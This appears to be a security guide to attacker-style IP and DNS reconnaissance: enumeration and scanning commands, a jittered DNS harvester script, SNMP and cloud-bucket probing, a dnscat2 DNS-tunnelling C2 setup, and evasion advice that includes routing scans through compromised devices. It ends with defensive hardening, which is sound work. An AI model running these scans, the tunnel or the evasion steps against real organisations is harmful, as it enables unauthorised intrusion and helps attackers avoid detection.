1. Reconnaissance: Mapping the Target Network Surface

Adversary Goals: Enumerate ASN/netblocks, cloud ranges, and ownership attribution before sending any packet to the target. Identify where the target lives on the Internet, who peers with them, and which regions they operate in.

IP addresses uniquely identify devices on a network. They enable traffic routing, network segmentation, and visibility during both offensive and defensive operations. For adversaries, the goal is to map the entire address space belonging to an organisation without triggering alerts.

ASN & Netblock Enumeration

# Query RADB for announced prefixes by ASN
whois -h whois.radb.net '!gAS15169' | grep '^[0-9]'

# Using bgpq4 to generate prefix-lists for a target ASN
bgpq4 -S RADB -4 AS-TARGETORG > target_prefixes.txt

# Reverse WHOIS pivot: find other domains by registrant email/org
whois -h whois.rdap.net "email=admin@target.com"
whois -h whois.rdap.net "orgname=Target Org Inc."

# Identify cloud-hosted ranges (AWS example)
curl -s https://ip-ranges.amazonaws.com/ip-ranges.json \
  | jq -r '.prefixes[] | select(.region=="eu-west-2") | .ip_prefix' \
  > aws_ranges.txt

IP Reputation & Ownership Verification

# Quick enrichment via ipinfo (passive, low noise)
curl -s "https://ipinfo.io/8.8.8.8/json?token=$IPINFO_KEY" \
  | jq '{ip, org, asn, country, loc}'

# Check if a netblock is already flagged (avoid "burned" infrastructure)
curl -s "https://api.abuseipdb.com/api/v2/check-block?network=1.2.3.0/24" \
  -H "Key: $ABUSE_KEY" -H "Accept: application/json" \
  | jq '.data.reportedAddressCount'

# GreyNoise context for scanning behaviour of a target IP
curl -s "https://api.greynoise.io/v3/community/1.2.3.4" \
  -H "Accept: application/json" \
  | jq '{ip, noise, riot, classification}'
Note:
All WHOIS and passive API queries above generate no traffic to the target. This is pure OSINT reconnaissance and should remain within scope and legal boundaries.

2. DNS Enumeration: Harvesting Records, Subdomains & Misconfigurations

Adversary Goals: Extract every host name, mail exchanger, and SPF/DKIM policy leak; attempt zone transfers; brute-force subdomains; and map the internal architecture via naming conventions. DNS maps human-readable domains to machine IPs, it's a prime reconnaissance target.

Manual DNS Reconnaissance

# Baseline record extraction
dig +short ANY target.com
dig +short MX target.com
dig +short TXT target.com | grep -iE "spf|dkim|verify|google-site-verification"
dig +short NS target.com

# Attempt zone transfer (AXFR) — still viable on misconfigured DNS
for ns in $(dig +short NS target.com); do
    echo "[*] Trying AXFR via $ns ..."
    dig @$ns target.com AXFR +short
done

# Reverse DNS sweep on a known netblock
for ip in $(seq 1 254); do
    host 192.168.1.$ip | grep "domain name"
done

Automated Subdomain Discovery

# Certificate Transparency logs (passive, high yield)
curl -s "https://crt.sh/?q=%.target.com&output=json" \
  | jq -r '.[].name_value' | sort -u > ct_subdomains.txt

# Active brute-force with dnsenum
dnsenum --enum -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    -r target.com

# MassDNS for high-speed resolution of discovered names
massdns -r /usr/share/seclists/Misc/dns-resolvers.txt -t A -o S \
    ct_subdomains.txt > resolved_subdomains.txt

Python Automation: DNS Harvester with Jitter

#!/usr/bin/env python3
# Conceptual adversary tool: DNS reconnaissance with evasion jitter
import dns.resolver, time, random

subdomains = ["vpn", "mail", "dev", "staging", "api", "git", "jenkins", "confluence"]
for sub in subdomains:
    fqdn = f"{sub}.target.com"
    try:
        answers = dns.resolver.resolve(fqdn, "A")
        for rdata in answers:
            print(f"[HIT] {fqdn} -> {rdata}")
    except dns.resolver.NXDOMAIN:
        pass
    # Jitter to avoid resolver rate-limiting and correlation
    time.sleep(random.uniform(1.5, 4.0))
Note:
Aggressive DNS brute-forcing can trigger alerts at managed DNS providers (Cloudflare, Route53). Adversaries often use distributed resolvers and temporal jitter to stay below threshold.

3. Infrastructure Mapping: From Hosts to Exposed Services

Adversary Goals: Convert DNS names and netblocks into a live target list; identify open ports, banners, and IoT/cloud exposures without (or before) full port scanning.

Passive Discovery via Shodan & Censys

# Shodan CLI: enumerate exposed assets by organisation keyword (no packets to target)
shodan search --fields ip_str,port,org,hostnames,title \
    "org:\"Target Organisation\" country:GB"

# Find specific devices/platforms
shodan search --fields ip_str,port "hostname:*.target.com \"Apache\""

# Censys: certificate-based host discovery
censys search "services.tls.certificates.leaf_data.subject.common_name: target.com" \
    --index-type hosts --fields ip,services.port,services.service_name

# Historical DNS / IP pivoting (avoids live scanning)
curl -s "https://api.securitytrails.com/v1/history/target.com/dns/a" \
    -H "APIKEY: $ST_KEY" \
    | jq -r '.records[].values[].ip' | sort -u > historical_ips.txt

Active Mass Scanning

# Masscan: high-speed port sweep of discovered prefixes
sudo masscan -iL target_prefixes.txt -p0-65535 --rate 15000 \
    -oX masscan_results.xml --excludefile exclude.txt

# Nmap targeted follow-up on live hosts with service/version detection
nmap -sV -sC -Pn -p- \
    -iL live_hosts.txt \
    -oA nmap_full_scan --open

# Quick UDP probe for DNS, SNMP, IKE
sudo nmap -sU -Pn --top-ports 100 -iL live_hosts.txt -oA nmap_udp

Banner & Technology Fingerprinting

# Grab HTTP titles from discovered web services
cat open_http.txt | httpx -title -tech-detect -status-code -o web_fingerprint.csv

# SNMP community string probing (often reveals internal architecture)
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt \
    -i live_hosts.txt

4. Adversarial Pivoting: Geo-Targeting, Tunneling & Shadow IT Discovery

Sophisticated adversaries do not stop at DNS records. They abuse DNS for covert channels, leverage geolocation for pretexting, and hunt for orphaned cloud buckets or shadow services.

Geolocation & Target Prioritisation

# Validate target location to align phishing pretexts or select nearest VPS hop
curl -s "https://ipinfo.io/8.8.8.8/json" | jq '{city, region, country, loc, org}'

# Batch geo-enrichment for all discovered IPs
while read ip; do
    curl -s "https://ipinfo.io/${ip}/loc"
    echo " $ip"
done < live_hosts.txt > geo_targets.txt

Cloud Shadow IT & Bucket Discovery

# Derive S3 buckets from domain naming conventions
for bucket in target-backups target-dev target-staging target-public; do
    code=$(curl -s -o /dev/null -w "%{http_code}" "https://${bucket}.s3.amazonaws.com/")
    echo "[*] ${bucket}: HTTP ${code}"
done

# Azure blob permutation check
for blob in target targetmedia targetfiles; do
    curl -s -I "https://${blob}.blob.core.windows.net/" | grep "HTTP"
done

DNS Tunneling Concept

# Conceptual adversary tradecraft: DNS covert channel setup
# Server side (C2):
# ruby ./dnscat2.rb --dns "server=0.0.0.0,port=53,domain=d.example.com"

# Client side (implant):
# ./dnscat2 d.example.com

# Blue teams hunt for this via abnormally long DNS queries and high query volume
# to uncommon subdomains.
  • DNS Cache Poisoning: Redirects legitimate traffic to attacker-controlled infrastructure for credential capture or malware delivery.
  • DNS Amplification: Abuse of open resolvers to fuel DDoS operations; adversaries probe for open resolvers during target reconnaissance.
  • DNS Hijacking: Compromise of registrar credentials or manipulation of NS records to redirect entire domain zones.

5. Adversary OPSEC & Evasion Techniques

IP and DNS reconnaissance is noisy by nature. Adversaries separate passive intelligence (no packets to target) from active probing, and take steps to avoid attribution when they do scan.

  • Passive-first workflow: Exhaust Shodan, Censys, certificate transparency, and historical DNS before ever touching masscan or nmap. This leaves no logs on the defender's edge.
  • Exit-node vetting: Verify scanner IP against commercial blocklists before ops. If the target uses GreyNoise or similar, a direct VPS scan is instantly flagged.
  • Proxy / residential relay: Route active scans through residential proxies or compromised edge devices to avoid ASN-level blacklisting.
  • Temporal jitter: Space DNS brute-force queries and nmap SYN packets over hours or days with randomised delays to evade threshold-based detection.
  • DNS resolver rotation: Cycle through public resolvers (8.8.8.8, 1.1.1.1, 9.9.9.9) to avoid single-source correlation by the target's authoritative nameserver logs.
  • Metadata sanitisation: Strip API keys, User-Agent strings, and client fingerprints from automated scripts. Burner accounts/keys for paid APIs (SecurityTrails, ipinfo) prevent subscription linkage.
  • Spoofed source ports & IP fragmentation: Advanced adversaries fragment probes or use non-standard source ports to evade simplistic firewall logging rules.
# Verify your own exit identity before active scanning
curl -s ipinfo.io/json | jq '{ip, org, country, vpn_proxy_detection: .privacy}'

# Check if your exit IP is already in threat intel (self-check before engagement)
curl -s "https://api.greynoise.io/v3/community/$(curl -s ipinfo.io/ip)" \
    | jq '{noise, riot, classification}'
Blue Team Note:
Most adversary reconnaissance (WHOIS, certificate logs, passive DNS, Shodan) generates zero server-side logs on your infrastructure. Detection must shift to: anomaly alerts on your DNS provider (CT log monitoring, AXFR abuse), dark-web leak monitoring, and external attack-surface management platforms.

6. Defensive Countermeasures & Threat Mapping

Translating adversarial IP/DNS reconnaissance into defense requires attack-surface reduction, continuous external monitoring, and DNS hardening.

  • DNSSEC: Implement DNSSEC on all zones to prevent cache poisoning and integrity attacks.
  • Zone transfer restriction: Explicitly deny AXFR except from known secondary nameserver IPs.
  • Split-horizon DNS: Internal records must never be exposed externally.
  • Subdomain/asset hygiene: Decommission forgotten dev/staging hosts; they are often the entry point nmap finds first.
  • Metadata scrubbing: Remove SPF/DKIM leaks in TXT records that reveal internal SaaS vendors (e.g., google-site-verification=... reveals Google Workspace usage).
  • IoT/Cloud exposure audits: Weekly queries on Shodan/Censys for your own netblocks to catch rogue deployments.
  • Registrar hardening: MFA on registrar accounts, registry lock enabled, monitoring for unauthorised WHOIS changes.
  • Geo-anomaly detection: Tag inbound flows with ASN/country in your SIEM; alert on impossible travel or regionally anomalous login patterns.

DNS-Specific Hardening Checklist

  • Implement DNSSEC for record integrity.
  • Segment internal and external DNS (split-brain) with robust query logging.
  • Monitor DNS traffic volume and query-length anomalies for tunneling.
  • Enforce MFA on registrar and DNS management portals.
  • Restrict zone transfers (AXFR/IXFR) to explicitly authorised secondary servers.
  • Use Response Rate Limiting (RRL) on authoritative resolvers to mitigate amplification abuse.
